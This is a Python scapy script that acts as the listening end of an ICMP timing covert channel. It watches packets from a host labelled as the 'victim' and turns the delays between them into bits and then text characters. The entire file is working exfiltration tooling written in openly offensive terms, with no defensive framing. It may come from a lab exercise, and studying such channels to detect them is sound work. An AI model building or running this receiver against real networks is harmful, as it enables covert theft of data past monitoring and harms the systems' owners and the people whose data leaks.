from scapy.all import sniff, IP, ICMP
import time

# --- CONFIGURATION ---
VICTIM_IP = "10.0.0.6" 
INTERFACE = "eth0"     

# --- THRESHOLDS ---
# '0' is 0.2s -> We accept anything < 0.4s
DOT_LIMIT  = 0.4  
# '1' is 0.6s -> We accept anything < 0.9s
DASH_LIMIT = 0.9  

last_time = 0
current_binary = ""
received_text = ""

def process_timing_covert_channel(packet):
    global last_time, current_binary, received_text
    
    # 1. Filter: Only look at packets FROM the Victim
    if not packet.haslayer(IP) or packet[IP].src != VICTIM_IP:
        return

    current_time = time.time()
    
    # 2. Sync Logic (First packet starts the clock)
    if last_time == 0:
        last_time = current_time
        print(f"[*] Clock Synced with {VICTIM_IP}. Listening...")
        return

    # 3. Calculate Delta
    delta = current_time - last_time
    last_time = current_time

    # 4. Decode
    if delta < DOT_LIMIT:
        current_binary += "0"
        print(".", end="", flush=True)
    elif delta < DASH_LIMIT:
        current_binary += "1"
        print("-", end="", flush=True)
    else:
        # Gap > 0.9s means "End of Character"
        if len(current_binary) == 8:
            try:
                char = chr(int(current_binary, 2))
                received_text += char
                print(f" [Captured: {char}]")
            except ValueError:
                print(" [Error: Byte Fail]")
        else:
            # Partial/Garbage data check (ignores fragments)
            if len(current_binary) > 0:
                pass 
        
        current_binary = ""

    # Failsafe for buffer overflow
    if len(current_binary) > 8:
        current_binary = ""

print(f"[*] Listening for Covert ICMP from {VICTIM_IP} on {INTERFACE}...")
sniff(filter="icmp", iface=INTERFACE, prn=process_timing_covert_channel, store=0)
